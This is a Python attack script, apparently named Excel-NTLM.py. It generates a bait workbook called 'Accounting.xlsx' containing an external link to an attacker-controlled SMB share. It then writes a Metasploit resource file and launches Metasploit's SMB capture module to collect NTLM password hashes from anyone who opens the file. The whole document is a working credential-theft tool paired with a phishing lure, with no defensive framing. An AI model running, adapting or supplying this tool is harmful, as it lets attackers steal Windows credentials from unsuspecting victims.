from os import system
import sys
import time
import xlsxwriter


def createXLSX(filename, server):
	workbook = xlsxwriter.Workbook(filename)
	worksheet = workbook.add_worksheet()
	worksheet.write_url('AZ1', "external://"+server+"\\share\\[Workbookname.xlsx]SheetName'!$B$2:$C$62,2,FALSE)")
	workbook.close()
	print("Fichero creado")


def msfListener(ipAttacker):
	resourceFile = open('metasploit.rc','w')
	resourceFile.write('''
use auxiliary/server/capture/smb
set SRVHOST <SERVER>
set SRVPORT 445
set JOHNPWFILE hashescaptured
run
'''.replace('<SERVER>',ipAttacker))
	resourceFile.close()
	print('[+] MSF Resource file generated ')
	system('msfconsole -q -r metasploit.rc')

def main():
	if(len(sys.argv) < 2):
		print('Usage : Excel-NTLM.py IP_ATTACKER')
		print('Example : Excel-NTLM.py 10.10.1.110')

	else:
		host = str(sys.argv[1])
		createXLSX("Accounting.xlsx", host)
		msfListener(host)

if __name__ == "__main__":
    main()
